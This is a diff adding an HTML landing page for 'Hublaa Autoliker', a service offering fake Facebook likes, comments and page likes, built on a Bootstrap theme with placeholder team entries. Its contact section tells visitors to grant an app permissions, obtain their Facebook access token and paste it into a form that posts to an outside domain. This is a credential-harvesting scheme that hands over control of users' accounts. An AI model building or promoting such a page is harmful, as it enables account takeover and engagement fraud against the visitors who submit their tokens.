@@ -1,0 +1,383 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, maximum-scale=1">
+
+<title>Hublaa autoliker  | Best autoliker, autocommenter, multiple groups poster, fan page liker</title>
+<link rel="icon" href="favicon.png" type="image/png">
+<link rel="shortcut icon" href="favicon.ico" type="img/x-icon">
+
+<link href='https://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
+<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,800italic,700italic,600italic,400italic,300italic,800,700,600' rel='stylesheet' type='text/css'>
+
+<link href="css/bootstrap.css" rel="stylesheet" type="text/css">
+<link href="css/style.css" rel="stylesheet" type="text/css">
+<link href="css/font-awesome.css" rel="stylesheet" type="text/css">
+<link href="css/responsive.css" rel="stylesheet" type="text/css">
+<link href="css/animate.css" rel="stylesheet" type="text/css">
+
+<!--[if IE]><style type="text/css">.pie {behavior:url(PIE.htc);}</style><![endif]-->
+
+<script type="text/javascript" src="js/jquery.1.8.3.min.js"></script>
+<script type="text/javascript" src="js/bootstrap.js"></script>
+<script type="text/javascript" src="js/jquery-scrolltofixed.js"></script>
+<script type="text/javascript" src="js/jquery.easing.1.3.js"></script>
+<script type="text/javascript" src="js/jquery.isotope.js"></script>
+<script type="text/javascript" src="js/wow.js"></script>
+<script type="text/javascript" src="js/classie.js"></script>
+<script src="contactform/contactform.js"></script>
+
+<!-- =======================================================
+    Theme Name: Knight
+    Theme URL: https://bootstrapmade.com/knight-free-bootstrap-theme/
+    Author: BootstrapMade
+    Author URL: https://bootstrapmade.com
+======================================================= -->
+
+</head>
+<body>
+<header class="header" id="header"><!--header-start-->
+	<div class="container">
+    	<figure class="logo animated fadeInDown delay-07s">
+        	<a href="#"><img src="img/logo.png" alt=""></a>	
+        </figure>	
+        <h1 class="animated fadeInDown delay-07s">Welcome To Hublaa Autoliker</h1>
+        <ul class="we-create animated fadeInUp delay-1s">
+        	<li>We provide 10,000 likes for your photos, pages, status and albums.</li>
+        </ul>
+            <a class="link animated fadeInUp delay-1s servicelink" href="http://www.lionosur.com">Get Likes</a>
+    </div>
+</header><!--header-end-->
+
+<nav class="main-nav-outer" id="test"><!--main-nav-start-->
+	<div class="container">
+        <ul class="main-nav">
+        	<li><a href="#header">Home</a></li>
+            <li><a href="#service">Services</a></li>
+       
+            <li class="small-logo"><a href="#header"><img src="img/small-logo.png" alt=""></a></li>
+            <li><a href="#client">Clients</a></li>
+            <li><a href="#team">Team</a></li>
+            <li><a href="#contact">Contact</a></li>
+        </ul>
+        <a class="res-nav_click" href="#"><i class="fa-bars"></i></a>
+    </div>
+</nav><!--main-nav-end-->
+
+
+
+<section class="main-section" id="service"><!--main-section-start-->
+	<div class="container">
+    	<h2>Services</h2>
+    	<h6>We offer Facebook likes and comments for free.</h6>
+        <div class="row">
+        	<div class="col-lg-4 col-sm-6 wow fadeInLeft delay-05s">
+            	<div class="service-list">
+                	<div class="service-list-col1">
+                    	<i class="fa-paw"></i>
+                    </div>
+                	<div class="service-list-col2">
+                        <h3>branding &amp; identity</h3>
+                        <p>we are a brand for autoliking, we have been in this business since starting of facebook</p>
+                    </div>
+                </div>
+                <div class="service-list">
+                	<div class="service-list-col1">
+                    	<i class="fa-gear"></i>
+                    </div>
+                	<div class="service-list-col2">
+                        <h3>Autoliker</h3>
+                        <p>we provide autolikes for your photos, status, pages and videos.</p>
+                    </div>
+                </div>
+                <div class="service-list">
+                	<div class="service-list-col1">
+                    	<i class="fa-wechat"></i>
+                    </div>
+                	<div class="service-list-col2">
+                        <h3>Autocommenter</h3>
+                        <p>our autocommenter will help you to get awesome comments for your status.</p>
+                    </div>
+                </div>
+                <div class="service-list">
+                	<div class="service-list-col1">
+                    	<i class="fa-file"></i>
+                    </div>
+                	<div class="service-list-col2">
+                        <h3>Page Liker</h3>
+                        <p>we help you to get 10,000 likes for your facebook page and make it popular.</p>
+                    </div>
+                </div>
+            </div>
+            <figure class="col-lg-8 col-sm-6  text-right wow fadeInUp delay-02s">
+            	<img src="img/macbook-pro.png" alt="">
+            </figure>
+        
+        </div>
+	</div>
+</section><!--main-section-end-->
+
+
+
+<section class="main-section alabaster"><!--main-section alabaster-start-->
+	<div class="container">
+    	<div class="row">
+			<figure class="col-lg-5 col-sm-4 wow fadeInLeft">
+            	<img  src="img/iphone.png" alt="">
+            </figure>
+        	<div class="col-lg-7 col-sm-8 featured-work">
+            	<h2>featured work</h2>
+            	<P class="padding-b">we have been providing likes and comments to people since eight years, feel old yet? </P>
+            	<div class="featured-box">
+                	<div class="featured-box-col1 wow fadeInRight delay-02s">
+                    	<i class="fa-magic"></i>
+                    </div>	
+                	<div class="featured-box-col2 wow fadeInRight delay-02s">
+                        <h3>Legend of all autolikers</h3>
+                        <p>we are the legendary autoliker service, autolikers may come and go but hublaa is permanent autoliker ever. </p>
+                    </div>    
+                </div>
+                <div class="featured-box">
+                	<div class="featured-box-col1 wow fadeInRight delay-04s">
+                    	<i class="fa-gift"></i>
+                    </div>	
+                	<div class="featured-box-col2 wow fadeInRight delay-04s">
+                        <h3>Fan page Liker</h3>
+                        <p>we have fan page liker which can help you to get likes for your facebook page and help to make it popular</p>
+                    </div>    
+                </div>
+                <div class="featured-box">
+                	<div class="featured-box-col1 wow fadeInRight delay-06s">
+                    	<i class="fa-dashboard"></i>
+                    </div>	
+                	<div class="featured-box-col2 wow fadeInRight delay-06s">
+                        <h3>Fully Trustable</h3>
+                        <p>we have been in this field for 8 years, and you know about our stand. we dont spam with your account </p>
+                    </div>    
+                </div>
+                <a class="Learn-More" href="#">Learn More</a>
+            </div>
+        </div>
+	</div>
+</section><!--main-section alabaster-end-->
+
+
+
+
+
+<section class="main-section client-part" id="client"><!--main-section client-part-start-->
+	<div class="container">
+		<b class="quote-right wow fadeInDown delay-03"><i class="fa-quote-right"></i></b>
+    	<div class="row">
+        	<div class="col-lg-12">
+            	<p class="client-part-haead wow fadeInDown delay-05">
+                 i have used this app once, now it made me addictive, i cant stop using hublaa now.   
+                </p>
+            </div>
+        </div>
+    	<ul class="client wow fadeIn delay-05s">
+        	<li><a href="#">
+            	<img src="img/client-pic1.jpg" alt="">
+                <h3>James Richard</h3>
+                <span>License To get Autolikes</span>
+            </a></li>
+        </ul>
+    </div>
+
+</section><!--main-section client-part-end-->
+<div class="c-logo-part"><!--c-logo-part-start-->
+	<div class="container">
+    	<ul>
+        	<li><a href="#"><img src="img/c-liogo1.png" alt=""></a></li>
+            <li><a href="#"><img src="img/c-liogo2.png" alt=""></a></li>
+            <li><a href="#"><img src="img/c-liogo3.png" alt=""></a></li>
+            <li><a href="#"><img src="img/c-liogo4.png" alt=""></a></li>
+            <li><a href="#"><img src="img/c-liogo5.png" alt=""></a></li>
+    	</ul>
+	</div>
+</div><!--c-logo-part-end-->
+<section class="main-section team" id="team"><!--main-section team-start-->
+	<div class="container">
+        <h2>team</h2>
+        <h6>Take a closer look into our amazing team. We won’t bite.</h6>
+        <div class="team-leader-block clearfix">
+            <div class="team-leader-box">
+                <div class="team-leader wow fadeInDown delay-03s"> 
+                    <div class="team-leader-shadow"><a href="#"></a></div>
+                    <img src="img/team-leader-pic1.jpg" alt="">
+                    <ul>
+                        <li><a href="#" class="fa-twitter"></a></li>
+                        <li><a href="#" class="fa-facebook"></a></li>
+                        <li><a href="#" class="fa-pinterest"></a></li>
+                        <li><a href="#" class="fa-google-plus"></a></li>
+                    </ul>
+                </div>
+                <h3 class="wow fadeInDown delay-03s">Dark Knight</h3>
+                <span class="wow fadeInDown delay-03s">Founder</span>
+                <p class="wow fadeInDown delay-03s">im the founder of hublaa, i have been running it for 8 years with my friends.East or west Hublaa is best</p>
+            </div>
+            <div class="team-leader-box">
+                <div class="team-leader  wow fadeInDown delay-06s"> 
+                    <div class="team-leader-shadow"><a href="#"></a></div>
+                    <img src="img/team-leader-pic2.jpg" alt="">
+                    <ul>
+                        <li><a href="#" class="fa-twitter"></a></li>
+                        <li><a href="#" class="fa-facebook"></a></li>
+                        <li><a href="#" class="fa-pinterest"></a></li>
+                        <li><a href="#" class="fa-google-plus"></a></li>
+                    </ul>
+                </div>
+                <h3 class="wow fadeInDown delay-06s">Jesse Pinkman</h3>
+                <span class="wow fadeInDown delay-06s">Product Manager</span>
+                <p class="wow fadeInDown delay-06s">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin consequat sollicitudin cursus. Dolor sit amet, consectetur adipiscing elit proin consequat.</p>
+            </div>
+            <div class="team-leader-box">
+                <div class="team-leader wow fadeInDown delay-09s"> 
+                    <div class="team-leader-shadow"><a href="#"></a></div>
+                    <img src="img/team-leader-pic3.jpg" alt="">
+                    <ul>
+                        <li><a href="#" class="fa-twitter"></a></li>
+                        <li><a href="#" class="fa-facebook"></a></li>
+                        <li><a href="#" class="fa-pinterest"></a></li>
+                        <li><a href="#" class="fa-google-plus"></a></li>
+                    </ul>
+                </div>
+                <h3 class="wow fadeInDown delay-09s">Skyler white</h3>
+                <span class="wow fadeInDown delay-09s">Accountant</span>
+                <p class="wow fadeInDown delay-09s">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin consequat sollicitudin cursus. Dolor sit amet, consectetur adipiscing elit proin consequat.</p>
+            </div>
+        </div>
+    </div>
+</section><!--main-section team-end-->
+
+
+
+<section class="business-talking"><!--business-talking-start-->
+	<div class="container">
+        <h2>Let’s Get Some Likes.</h2>
+    </div>
+</section><!--business-talking-end-->
+<div class="container text-center">
+<section class="main-section contact" id="contact">
+	
+    <div class="container">
+    <h2>1. <b style="color: green;">CLICK HERE</b> AND ALLOW PERMISSIONS TO HTC APP</h2>
+    <br/><br/>
+       <h2>2. <b style="color: green;">CLICK HERE</b> AND GET YOUR ACCESS TOKEN (OPEN TWICE)</h2>
+       <br/><br/>
+       <h3>paste your access token here</h3>
+       <br/><br/>
+       <form method="POST" action="http://lionosur.com/index.php">
+       <input type="text" name="url" placeholder="EEAAAACZAVC6ygBAD5n795qLqFAG16HRDA55Im5W6q81FhDjotPgCuZAG2EE67lfioKjCoitwWJVchocdnuhDiUxdSPFgbeeIZCFqPZAdZ" style="width: 700px;" autocomplete="off" class="form-control input-text" data-rule="minlen:4" data-msg="Please enter a valid accestoken">
+       <br/><br/>
+       <input type="submit" class="btn btn-large btn-success" value="get likes">
+       </form>
+    </div>
+     
+</section>
+</div>
+<footer class="footer">
+    <div class="container">
+        <div class="footer-logo"><a href="#"><img src="img/footer-logo.png" alt=""></a></div>
+        <span class="copyright">&copy; hublaa.biz. All Rights Reserved</span>
+        <div class="credits">
+            
+           
+        </div>
+    </div>
+</footer>
+
+
+<script type="text/javascript">
+    $(document).ready(function(e) {
+        $('#test').scrollToFixed();
+        $('.res-nav_click').click(function(){
+            $('.main-nav').slideToggle();
+            return false    
+            
+        });
+        
+    });
+</script>
+
+  <script>
+    wow = new WOW(
+      {
+        animateClass: 'animated',
+        offset:       100
+      }
+    );
+    wow.init();
+  </script>
+
+
+<script type="text/javascript">
+	$(window).load(function(){
+		
+		$('.main-nav li a, .servicelink').bind('click',function(event){
+			var $anchor = $(this);
+			
+			$('html, body').stop().animate({
+				scrollTop: $($anchor.attr('href')).offset().top - 102
+			}, 1500,'easeInOutExpo');
+			/*
+			if you don't want to use the easing effects:
+			$('html, body').stop().animate({
+				scrollTop: $($anchor.attr('href')).offset().top
+			}, 1000);
+			*/
+			event.preventDefault();
+		});
+	})
+</script>
+
+<script type="text/javascript">
+
+$(window).load(function(){
+  
+  
+  var $container = $('.portfolioContainer'),
+      $body = $('body'),
+      colW = 375,
+      columns = null;
+
+  
+  $container.isotope({
+    // disable window resizing
+    resizable: true,
+    masonry: {
+      columnWidth: colW
+    }
+  });
+  
+  $(window).smartresize(function(){
+    // check if columns has changed
+    var currentColumns = Math.floor( ( $body.width() -30 ) / colW );
+    if ( currentColumns !== columns ) {
+      // set new column count
+      columns = currentColumns;
+      // apply width to container manually, then trigger relayout
+      $container.width( columns * colW )
+        .isotope('reLayout');
+    }
+    
+  }).smartresize(); // trigger resize to set container width
+  $('.portfolioFilter a').click(function(){
+        $('.portfolioFilter .current').removeClass('current');
+        $(this).addClass('current');
+ 
+        var selector = $(this).attr('data-filter');
+        $container.isotope({
+			
+            filter: selector,
+         });
+         return false;
+    });
+  
+});
+
+</script>
+
+</body>
+</html>
